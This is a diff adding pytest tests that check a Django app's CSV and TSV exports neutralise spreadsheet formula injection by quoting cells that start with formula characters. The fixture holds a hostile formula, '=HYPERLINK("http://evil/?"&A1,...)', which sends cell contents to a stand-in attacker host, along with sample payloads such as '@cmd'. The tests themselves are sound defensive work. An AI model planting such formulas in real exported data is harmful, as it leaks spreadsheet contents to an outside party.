@@ -148,3 +148,66 @@ class TestOtherFormats:
         for fmt in ("csv", "tsv", "json"):
             response = client_in.get(reverse(LIST), {"export": fmt})
             assert response["Cache-Control"] == "no-store", fmt
+
+
+class TestFormulaInjection:
+    """A free-text cell that starts like a formula runs when the file is opened."""
+
+    EVIL = '=HYPERLINK("http://evil/?"&A1,"x")'
+
+    @pytest.fixture
+    def hostile(self, db):
+        ada = Author.objects.create(name=self.EVIL, email="ada@example.com")
+        Post.objects.create(
+            title="+SUM(1+1)",
+            slug="p",
+            body="b",
+            author=ada,
+            summary="@cmd",
+            rating="-1.50",
+            view_count=3,
+        )
+
+    def export(self, fmt, columns, headers=None):
+        from vantage.export import stream_export
+
+        response = stream_export(
+            fmt, Post.objects.all(), columns, headers or columns, "f", masked=frozenset()
+        )
+        return b"".join(response.streaming_content).decode()
+
+    def test_text_that_starts_like_a_formula_is_quoted(self, hostile):
+        rows = list(csv.reader(io.StringIO(self.export("csv", ["title", "summary"]))))
+        assert rows[1] == ["'+SUM(1+1)", "'@cmd"]
+
+    @pytest.mark.parametrize("lead", ["=", "+", "-", "@", "\t", "\r"])
+    def test_every_formula_lead_is_covered(self, db, lead):
+        ada = Author.objects.create(name="Ada", email="ada@example.com")
+        Post.objects.create(title=f"{lead}x", slug="l", body="b", author=ada)
+        rows = list(csv.reader(io.StringIO(self.export("csv", ["title"]))))
+        assert rows[1] == [f"'{lead}x"]
+
+    def test_a_related_record_that_prints_as_a_formula_is_quoted(self, hostile):
+        rows = list(csv.reader(io.StringIO(self.export("csv", ["author"]))))
+        assert rows[1] == ["'" + self.EVIL]
+
+    def test_numbers_stay_numbers(self, hostile):
+        Post.objects.update(rating="-1.50")
+        rows = list(csv.reader(io.StringIO(self.export("csv", ["rating", "view_count"]))))
+        assert rows[1] == ["-1.50", "3"]
+
+    def test_ordinary_text_is_untouched(self, posts):
+        rows = list(csv.reader(io.StringIO(self.export("csv", ["title"]))))
+        assert sorted(row[0] for row in rows[1:]) == ["Alpha", "Beta", "Gamma"]
+
+    def test_tsv_shares_the_rule(self, hostile):
+        assert "'+SUM(1+1)" in self.export("tsv", ["title"])
+
+    def test_json_is_left_alone(self, hostile):
+        # JSON is not opened in a spreadsheet, and a client parsing it wants the value.
+        assert "+SUM(1+1)" in self.export("json", ["title"])
+        assert "'+SUM" not in self.export("json", ["title"])
+
+    def test_the_export_button_applies_it(self, client_in, hostile):
+        response = client_in.get(reverse(LIST), {"export": "csv"})
+        assert "'+SUM(1+1)" in b"".join(response.streaming_content).decode()
